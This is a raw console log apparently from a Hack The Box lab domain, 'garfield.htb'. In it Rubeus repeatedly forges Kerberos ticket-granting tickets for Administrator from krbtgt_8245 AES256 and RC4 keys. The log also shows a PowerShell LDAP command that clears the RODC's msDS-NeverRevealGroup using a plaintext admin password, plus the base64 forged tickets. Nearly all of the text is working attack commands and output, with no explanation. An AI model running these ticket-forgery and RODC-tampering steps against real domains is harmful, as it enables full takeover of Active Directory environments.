C:\>Rubeus.exe golden /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /krbtgt:krbtgt_8245 /outfile:rodc_tgt.kirbi                                                        
                                                                                                                                                                                                                                                                                         
   ______        _                                                                                                                                                                                                                                                                       
  (_____ \      | |                                                                                                                                                                                                                                                                      
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                                                                  
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                                                                                                 
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                                                                                                 
  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                         
  v2.0.0                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                         
[*] Action: Build TGT                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                         
[*] Building PAC       


[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 12:45:09 PM
[*] StartTime      : 4/6/2026 12:45:09 PM
[*] EndTime        : 4/6/2026 10:45:09 PM
[*] RenewTill      : 4/13/2026 12:45:09 PM

[*] base64(ticket.kirbi):

      doIFRzCCBUOgAwIBBaEDAgEWooIENDCCBDBhggQsMIIEKKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4ID7DCCA+igAwIBEqEDAgEDooID2gSCA9Y2T051
      ejIMJlI/vxB91ItUFas4HsrZC/LoGcRdaYOIXcsDGWDI2mOZRKafECOTG0aV09wUkcy448IT9x88HdXX
      ZdJsREEDrrhz/OedWbHKjnqgB+Aj0BeNjh2c7J6tuxrsBVLRoyesYekY76SrgrFHLNpOPtSkwahD87oy
      IJ2YJT1PC4kdo1RgEqRkNqx30gwu6TCLcOVH1QpFoMYQ/hoclnLzD1545gZ8e/wXkMLUsM7ncAHJczpD
      EVSVweu6xcyofncDFoBn17o/Ac7inpYqAigIyBjregIAq2PSQUvMXe6Al0OWnNXtrVeu8zj5O1s/twUI
      FThk2ECbEI+0rJgVvwNPDiR1Q3cOLzLVfvMLQxY9kQ6SRcmaZfnJYQ1tuTM/7rqbpoc32kmX0HfHV9BL
      HtqrUB/+kjPiMgxMSFtXaPHQqadM8hCqgytGeMYm+zEUaKLB0bvd6819hJohts+c+5M/xbUd5Gz0v0pj
      ijmI9Ni+A3q0GMCQXS+Rfjt43oIjsafXpTqvvK+ohVLM5t6N48vVLdIsNRP+ErCsSJfIeBoLeG2pOktc
      c51tIFvYS5ha1iz2MHtUjHIy4dbpCGLFbfQnYbLmiahpmLvir1CKvDxicVnhVfLKtPwfV5sAYTRdYmrM
      +Llu97KLvOepHi98d8uhhZUlbIEqO5zuPvo6CXP9CwvaRtqiK+OKqPL8V+LHd6bj4sby7PHOgchE4lgw
      xWmTI589g9J9Aoi8xf96rxJuj7qPHdBJ7M08KJdW5CZJLE1a5CPefs9X9o2CjplPtWFH0pAUPAYJbnsz
      QV8tvbrOvuVUHyzqXKmecRefq3Zsv+C2HCMu6KzpdsgPlCawlfuj2uh1Wz1g4crj2NhxWGS7NxHFNPY/
      kgTWyvGe6CeEPGr3+IrNdufPHwwlC+QKy1RhSYtD2ATKmZCV+pzCJwROfDpAO5sbaKjVssvWhj+oL+Zl
      T7gDMjkgNiZ0n3W9R1X57Uu37KQEkwdttUnWXn2DOeIFszHiq1GsiMyCuZjvKk/7JN/EH/DGub3dDYAS
      Y+MVAs1eseOs+K1D3w6NEUaPaVU1w6K7pF/M5CZczN/mKvUSYB/ud0UJ3a+/fNCJ5AlM2/YwLJRwzsY9
      qvFSSKb3FzT02KbZ84OAb4qUEPGgRW5eF9RsIxdgZzbs8mHpIu9eXxOKQn4uDYubnyEenxjw3IS5TKnw
      S3v7C2bGwJxIr6ROhgwu5q+3gcCnczeXAVuOHn/5pM7NN/fNw8Agm+Gp+/R+QLEWzawUN0Ii7lhtVaPV
      7spB0BFlOTxrzLyfwIVtekWyo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKh
      IgQgfa58mZ/F4xX7oGLe8vojbp62VSuBNfvOScosgJJvkouhDhsMR0FSRklFTEQuSFRCohowGKADAgEB
      oREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDQwNjE5NDUwOVqlERgPMjAyNjA0MDYx
      OTQ1MDlaphEYDzIwMjYwNDA3MDU0NTA5WqcRGA8yMDI2MDQxMzE5NDUwOVqoDhsMR0FSRklFTEQuSFRC
      qSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


[*] Ticket written to rodc_tgt_2026_04_06_19_45_09_Administrator_to_krbtgt@GARFIELD.HTB.kirbi



C:\>

C:\>powershell -c "Get-ADUser krbtgt_8245 -Properties msDS-KeyVersionNumber"


DistinguishedName     : CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
Enabled               : False
GivenName             : 
msDS-KeyVersionNumber : 1
Name                  : krbtgt_8245
ObjectClass           : user
ObjectGUID            : ec54f85a-536a-4f61-bf17-56c495d0800e
SamAccountName        : krbtgt_8245
SID                   : S-1-5-21-2502726253-3859040611-225969357-1603
Surname               : 
UserPrincipalName     : 




C:\>C:\>powershell -c "Get-ADUser krbtgt_8245 -Properties msDS-SecondaryKrbTgtNumber"


DistinguishedName          : CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
Enabled                    : False
GivenName                  : 
msDS-SecondaryKrbTgtNumber : 8245
Name                       : krbtgt_8245
ObjectClass                : user
ObjectGUID                 : ec54f85a-536a-4f61-bf17-56c495d0800e
SamAccountName             : krbtgt_8245
SID                        : S-1-5-21-2502726253-3859040611-225969357-1603
Surname                    : 
UserPrincipalName          : 


C:\>Rubeus.exe golden /rc4:445aa4221e751da37a10241d962780e2 /user:Administrator /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /krbtgt:krbtgt_8245 /targetid:8245 /outfile:rodc_tgt_exodia.kirbi

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 445AA4221E751DA37A10241D962780E2
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 445AA4221E751DA37A10241D962780E2
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 12:56:42 PM
[*] StartTime      : 4/6/2026 12:56:42 PM
[*] EndTime        : 4/6/2026 10:56:42 PM
[*] RenewTill      : 4/13/2026 12:56:42 PM

[*] base64(ticket.kirbi):

      doIFMzCCBS+gAwIBBaEDAgEWooIEMDCCBCxhggQoMIIEJKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4ID6DCCA+SgAwIBF6EDAgEDooID1gSCA9L0HDy7
      iZosNg/5OeZmibHQhdECWe29Kqd5AwKJymf5g1TH2zCDxRGF8DB5J0UkwzRPCmAlOaAWEEiFkn+O7v1A
      n6nLAVqKF3S9wbwYuq+W118QF5j4/99kPnT741DJO/baFsszLUeKYZpXiauuZ2EOckuYKzFGHkJOlBNi
      g27DqKoJWfSYy7W7cOqNmIPRlwBtbAyYgBgi83Hf2ki4tNLhEumUk5tPTw8r/iQUHYcAyoAw6YELP42N
      0Yg6ImtrnYgpVHRbxja6G9QJyyeHQqkzqGsdCbrebms/xF7mRbS2VlijkyhVjoFM1hEQ2P+2G+aav5zn
      ce0VHmrAhRjrygQQEI7Mv0u48FRtFqBz8BR1/hW5pmLnOPiZ4IX/+xVPqBbnt3n81CXIEn7WJ+/JwfS9
      0gzETILtV95waQLDaM4Ormj3y10PStvkPDLI5Ey2PMaECjIHRdzUbulufXEBCn35V+nXaykHCGYLtGN/
      +aZm1fjP1A28aPx+AcFvcjgoxKQRctZnkveTrE2/nmKG4lG84JC/PkVznhizXnl7ygciTK1lT+JgeL3/
      7OTNtc5r0XA0P/9vEesTUOCFSCKbvUmXl0Ozv2hy4spaJV1AxF64M1idWd2dMfPybvoHEIiEPC+DsSNz
      jE8OoO7FIvMBlSGiLB9xabguCIbUZCZ+VnFkPhFiA6Efe3BdjyDBKmcgiqRb68FEqhwo3XhnpZCjSATA
      a93yw+TPik5P51m+TzViaUeFuZXylld6nV/pbJ9c1r35/FS/NAg9fHLA+/0RYtLxmeWWqNtCIlmpImJO
      Bg5Z8OL3WUGbAzTgniWzQ0n6SPlAxP1lse1ufI6PiJh1D7IpdkRbOHfgAGpXcI4NKVdh+yurgzItjy1F
      /zjIT2g2gm4LrgZCWLd5DzOD5ouPZ2VQmEZZjdD7G2uh+ClxWrZssy946UuVEzp7MySgsKWgS4VwMV6I
      TURCnUkAwM/Uwt65kiZuzxuNeoSbRHdwPHAq1HRZm3GV88m6GDYxygQ2cz2IyEEsbbEU4tJ4fUAHqSh6
      Dh0EiqqtSI70y5QaSBzABZ89FtjtpJPGhsQmHsAlne5pGBqUCb0rDl8afC/IdotL0o751DwNLCYt08VR
      N/0A56qRaMyCmVYhExGRx3V3HqpQnliNfrng596fF1olwJV5o/dgJMbte+iIf5SSpOLlNDibSuBRkBd4
      r9j6fPS9VhdgdfdacYtKbK71pmRX7WBZH84IYFs/vLx3J4PSYCH3wx8qsmzmPPsdu9aVxhLQGlCAvbiX
      sYzgxnm7ZFTOEuKc0x+jge4wgeugAwIBAKKB4wSB4H2B3TCB2qCB1zCB1DCB0aAbMBmgAwIBF6ESBBDE
      IFC44M6flfvIWor2yQgSoQ4bDEdBUkZJRUxELkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAEDgAACkERgPMjAyNjA0MDYxOTU2NDJapREYDzIwMjYwNDA2MTk1NjQyWqYRGA8yMDI2MDQwNzA1
      NTY0MlqnERgPMjAyNjA0MTMxOTU2NDJaqA4bDEdBUkZJRUxELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRn
      dBsMZ2FyZmllbGQuaHRi


[*] Ticket written to rodc_tgt_exodia_2026_04_06_19_56_42_Administrator_to_krbtgt@GARFIELD.HTB.kirbi



C:\>��Name           SID                                            
Administrator  S-1-5-21-2502726253-3859040611-225969357-500   
Guest          S-1-5-21-2502726253-3859040611-225969357-501   
krbtgt         S-1-5-21-2502726253-3859040611-225969357-502   
krbtgt_8245    S-1-5-21-2502726253-3859040611-225969357-1603  
j.arbuckle     S-1-5-21-2502726253-3859040611-225969357-3101  
l.wilson       S-1-5-21-2502726253-3859040611-225969357-3105  
l.wilson_adm   S-1-5-21-2502726253-3859040611-225969357-3107  


C:\>powershell -c "$entry = New-Object System.DirectoryServices.DirectoryEntry('LDAP://10.129.139.64/CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb', 'l.wilson_adm', 'Garfield_HTB_Admin_2026!@#'); $entry.PutEx(1, 'msDS-NeverRevealGroup', $null); $entry.SetInfo()"

C:\>Rubeus.exe golden /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /krbtgt:krbtgt_8245 /kvno:1 /targetid:8245 /outfile:final_tgt.kirbi

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 1:03:17 PM
[*] StartTime      : 4/6/2026 1:03:17 PM
[*] EndTime        : 4/6/2026 11:03:17 PM
[*] RenewTill      : 4/13/2026 1:03:17 PM

[*] base64(ticket.kirbi):

      doIFRzCCBUOgAwIBBaEDAgEWooIENDCCBDBhggQsMIIEKKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4ID7DCCA+igAwIBEqEDAgEDooID2gSCA9YpZTos
      q+1Emz9GvWV2+VSpc9CYZpVOppooc1V12kDwak2sS+WzHBtXHf+sz6Hy5bV62l8cLhZ7oMCM8333skML
      Q3T922Oqn9k5xmimV8tIF+jfQrzq3pN5oZIxqgoG77wbQ7haWzxRikbTNYndLmiV3K5g+Mvepk1wlEFU
      Acrgt9gCxDfv/Ul+cteC3NsVxMrTovzlUIB5mUPjYGFkaNj4jqVs8BfemSlMweTLY/nkuIVzOKSVR+OD
      2+7pm9kry1iil6XYjjbQAZUe95gbyN4Whtvfe9WbEvMzI0TVqb59Ofpq8l36IvGIZLZDql10W2KP5n6Y
      wHzCDpUN13BJJJeTw8VAja9lPiDg7l+IBuftsRHmSOtsfVIoJcBIRyvX5HdvMK2isDrBTU1YkT8u9r4I
      QGKaLp339dSBewnf0RmyBt1hufF3aQm1dG7k4AbGNLpH+cAimBhwLnuI9DysFPDz+foSIFOJkBt00sSU
      ypRGiCxUmZah6fry7D/pAtt/lxUI9BuXyVqaRoeZ/uyUzNN5huBUeNLuyqD0qq+z3sxWAZQpmhcWuDnC
      KgWDnMcuy37OX3iPoB2L9W1pupHiBuvhF7fN+SXuPU5rQwLOsEc+m7lOPnXGEsgbX8tTxDwD6/tYb1UO
      r4+Ymo60pQKIb/9a7L2BsT/0n1j+N+FU1ldGr3juCJmTwiL1kUf9woJ86ZJXcT9Z/ajYXyfTcqO9hoz5
      tVvUyEkXQsefX+cGeqjLmM8dCAeegS7K026XZXHKI3jTeBVw3K/+7+e1FjcQNjujb8aCd4m6kK1yn3PJ
      DAlAaThVIivcflitSOdZGPjCOW45m4MuOTaurn/RDmkheurj0akfArsq6mUAvra3VDgQxoagD1I4US4i
      mPVGiYPpOHzENfgbRBd6qxh6OWuBYuTL8RczNwui+8CXMOfkUjYSHB45+0wRC/aXvyEmDG5MjNNhvgTN
      bukrUo02sqUiHFLfrcEwMYKlBegulMNzCXxsD+watQzqWKpOSr2icnTUnC9+lBJlLiPg7+cIf+dEELwU
      9hX97n4Mo0men1k5PV7bPQpVZLZe2WWnXsUJXNGUeeXnQxe0bI8SArkjmTTVqlEraWbV1DzGDPUtKW9f
      NKN1/IqH5oV8/kszd+hfWvjChgJjSVD/BeDINofgIAnUFZMrP5SRECxPXWav2xvaNhq3yzHhdL3VGM7J
      gTZGJMcbNhWtlZ1H6/Oke8gHBrl6pluZaOyniDQwBSH0IdGQIguyviknZn6Qgqm4mXqlg16GJaYOo9Qz
      cx5gYubsH+wasHOcua57ijXlo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKh
      IgQgRyLIjRJaYrNZEBN0EcvdG+0KC+cC6DoH+eZUw/izWuihDhsMR0FSRklFTEQuSFRCohowGKADAgEB
      oREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDQwNjIwMDMxN1qlERgPMjAyNjA0MDYy
      MDAzMTdaphEYDzIwMjYwNDA3MDYwMzE3WqcRGA8yMDI2MDQxMzIwMDMxN1qoDhsMR0FSRklFTEQuSFRC
      qSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


[*] Ticket written to final_tgt_2026_04_06_20_03_17_Administrator_to_krbtgt@GARFIELD.HTB.kirbi


Upload Rubeus   v2.3.3  and then try again to avoid integrity errors




C:\>Rubeus.exe golden /rc4:445aa4221e751da37a10241d962780e2 /user:Administrator /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /krbtgt:krbtgt_8245 /targetid:8245 /outfile:rodc_rc4_v233.kirbi

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 445AA4221E751DA37A10241D962780E2
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 445AA4221E751DA37A10241D962780E2
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 1:15:24 PM
[*] StartTime      : 4/6/2026 1:15:24 PM
[*] EndTime        : 4/6/2026 11:15:24 PM
[*] RenewTill      : 4/13/2026 1:15:24 PM

[*] base64(ticket.kirbi):

      doIFezCCBXegAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IEMDCCBCygAwIBF6EDAgEDooIEHgSCBBrKByCo
      gSMTkUTT5+GU1vpG95T1W7SlRJIZNXRXHAR9szcuhFW0SvIZkNYfv9CBTyuldHU8KriY8K0OTKgb6B0Y
      YjiYLWmwERgf3yst/TaR5tiN95f+hrnuIhWo+5kPobQh5CPePfrZ7XnKI3EC+AuSGNjse5K77NIGgEnu
      hhb/nYoLvK0MFec0B9dxCoCUA8rDZGjA6V+IehXrI5dXEdVRzEStI2nKGXdrHrjPQahxcaQkbrSbUAjW
      5/EnLZtdYcY5JjRGg9QdDw/iXB3TgjTPXTGlH/oZIycKQKNT+kikhSJcyg9u9UXIQfOyQx107iJOXBCX
      Xcj40b6wEFS55m/TI0E5y8tjyONMF6u6FLD+TRif2goMFVq4QopArZiI9wihIWphbWddo5qklOUM3QqL
      WRuxojOu+W6ikOi0P115I03fCWKp0NTF9bYqaMljLx6Cg7pHyYSRlpMr8ebkDf/65eKzBK3osEcB50/Q
      1zNwoR1wy7Kf0fyFy9G0NBqZXnFDJsiCOqSg+N9NGE8kEFUdSAeN6rawXmUN8YZokamob3O8kOFh9j5F
      2MJ5zO6NuwQnfFBIFdlQtXa0/AG30n4cTFmkMMBiBW0AxCOXQNS6ihFA9MDvnZtFg0LI31/wA9c61ERX
      31XFqYTcnDuXut/gQ/p4vSCcbDjq8x0IbDTOttwHTYnCR7jRKzV55kVCCUaJ9fYIU2NsRyLKdqlIsgPd
      E7f/TyXMzzCPxNQEquIgNMKUHOKPUSv7AjnwfAxEunbxo/0zQGMYpr3L+71VpToC+LV0DJYIZjG2ncm6
      SKiHWXDfYRswtDDdNZ6pBq2lVwO5CGxMnW+RBu8J76VDguG6nQbPiM3sihu4sr1IplUbVUvJGBuYnQs7
      6nFKKaNUHHVnH53ZGZDxeQymPOKt7g4m6g9pJcXhe0dUKfJN058mdQKo1K2TC43358WFOxHn5TfsTOb0
      jDOXMQYenQwcsI8LwtYphJI5u6nPV728MhATkHLDuCEvkaHGHYWAQtabQJe/2KEDqmFKayNaOei5qhYW
      0LUatFXI9ILmhPi9dpZsr0zbVKjxaK3thcGxkmghglzEBhrUvk9piL62AiaJPlJ7S0lDa3xJWChKLtl8
      M+SwQVbzE3WeF920hoYqdA0Fyg+NX2IbudGyM1zdYdcmQA8UT8Wy46lTI4SzzwOepW0hzmku2hIjeffh
      Mur2c5TODYcS8GzZtEjbsdwMiBAcQJ06gjubModn2eihUHr7bg9s7zjUHiN6tKAR9X3Zz1g7XQNhdaI6
      fNA7Joa0tjrLwDqiB+vlrH6MZY6XhlZQ3Ax7Xr21TPBxldSFpGoBM5kUL5Oo+gObLWZIwFBY/Bll2vg3
      nYQnSOJgC7VQgmYmkKvyZc9dPFnQOFB5MOqjge4wgeugAwIBAKKB4wSB4H2B3TCB2qCB1zCB1DCB0aAb
      MBmgAwIBF6ESBBApf4ozg8UIOC0qGclm5creoQ4bDEdBUkZJRUxELkhUQqIaMBigAwIBAaERMA8bDUFk
      bWluaXN0cmF0b3KjBwMFAEDgAACkERgPMjAyNjA0MDYyMDE1MjRapREYDzIwMjYwNDA2MjAxNTI0WqYR
      GA8yMDI2MDQwNzA2MTUyNFqnERgPMjAyNjA0MTMyMDE1MjRaqA4bDEdBUkZJRUxELkhUQqkhMB+gAwIB
      AqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRi


[*] Ticket written to rodc_rc4_v233_2026_04_06_20_15_24_Administrator_to_krbtgt@GARFIELD.HTB.kirbi



C:\>Rubeus.exe golden /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /kvno:540344321 /outfile:final_root.kirbi

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 1:27:30 PM
[*] StartTime      : 4/6/2026 1:27:30 PM
[*] EndTime        : 4/6/2026 11:27:30 PM
[*] RenewTill      : 4/13/2026 1:27:30 PM

[*] base64(ticket.kirbi):

      doIFjzCCBYugAwIBBaEDAgEWooIEfDCCBHhhggR0MIIEcKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENDCCBDCgAwIBEqEDAgEDooIEIgSCBB566GvM
      Uubv0aWLqaI0BzYu3hCJnHu7P6L4FdqDpZ/QE4sqympXqDSZi7Zl2SEromd5oMNxJ3ogBHZe6QiMksQN
      g6zFCJZNoOr6CzuK06kOrfqnm+nt084sv6Bj8FIKuq+wmUMPGcluO8oi2/OLKRL+OWRWVwYyMx0rsPYB
      nSD7SlDWeAkDAhR9onB/GKwb9FiIFHOMcSzeU0o/ZwL5+uijAS+kOQ8brn1ZX/nmryommBHH2RBnHlno
      eDNmnaXyumXgow+et6NL7wyDGzaLPiemEmclj/G4EHtIAdOsawFrPMITcwZoyeMIJ9b0IdpFVcw0UMrD
      q1uQOSsJVTVqPQctjN8zK+26da+QJVlJnjF58k/JMH4sF6cL/d7fb6PSGTfN5I8VboiNy2NEzHuPeKDB
      8xUOFUB+jvfZcRK/GkH48LCHWaU+t1J79d1zr63d+7jp87InMz5qj9bkmCQ75FbWVlQtA0GOgtVsrKlY
      bmFXHw+Y0M0bblTzHCAD+ECvwPy3Ejmi9k+A1W6rlb4AXrnjxBMvbvcu6Yly7nbwIKGX3jqb3JOGDp9k
      mG9sLF5cfkrLiVfoubpL8bc9UJKjcK2zG02z35rmmWsmIuQJ3O4x4GMXy6Y6dgsaROjEWNGHpU4r0JIf
      LDmkD5J9Pxw2ndur7+dkQz5fX7+U5DXUyjmhwEKyntNVxfe+fmKwmsGKWqACSllJaSnLS38TQAr6tMvq
      N9zOKgrfrGONMRkC8YE7itK41yOWnphC/vc19JIaHDZ5pHO78VhBla/GGVLIW9qbgggLfXWgFu9/DPBu
      FQkolMf8d8SChqDpIhp8c+Wh4iwPt6NTNXuamP6+VzW1Pfrd6SqH97D52CDy8zzohHIjtisEzt2LVo8C
      H/dBIJJY6jCc6LvJuXNRSxyiArvqbAskIr43TzfTm5r0BCZNnkN+ra17AgGkdJB7mrxEGAqxK1OlrxPo
      5oWUyAZwUDa9+0pENqlMqt4znelKrWsQowu+JprFoZkph8GdfhmwwZSaOgTKwXRVVo0zZI4MCGCNLkZg
      KFhpW3bxASLGYIdoy5auvaLMHxxGkj3imkroJISFlHFo6QG0X6Yi1iux18jT1vl2RIAe753D95fbZHcV
      qEXg8kij0oFNzf3QYvEZTUYWGLg3Y1srT5BiZhm1Q9mOe22VjXLDnIsyNgdYTmeFAvbWbKwMUjSJ79D/
      PGTSPk3zRbbluVCYtynTjHRimeCrGwIwlWQkPVTRhvb/umi539e67ngDX4g5N+m7LMY/o6phN+dWlPza
      0qJ+TwtOnKgw4GfM8e8bbYtkQhTDosAPmzKMyhD/KsxFuIHPcTvAuFzT4cIllnz14lJorVsaK+QLkxN8
      /kTrPEXX4et6I0l4g4KdpvJaArQ+m6n6r8BmNQTbo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQw
      geGgKzApoAMCARKhIgQgDgGbUjH3x2GTGuZpftneP6S4K1ad6fcxgnZCCVGoC8GhDhsMR0FSRklFTEQu
      SFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDQwNjIwMjczMFql
      ERgPMjAyNjA0MDYyMDI3MzBaphEYDzIwMjYwNDA3MDYyNzMwWqcRGA8yMDI2MDQxMzIwMjczMFqoDhsM
      R0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


[*] Ticket written to final_root_2026_04_06_20_27_30_Administrator_to_krbtgt@GARFIELD.HTB.kirbi



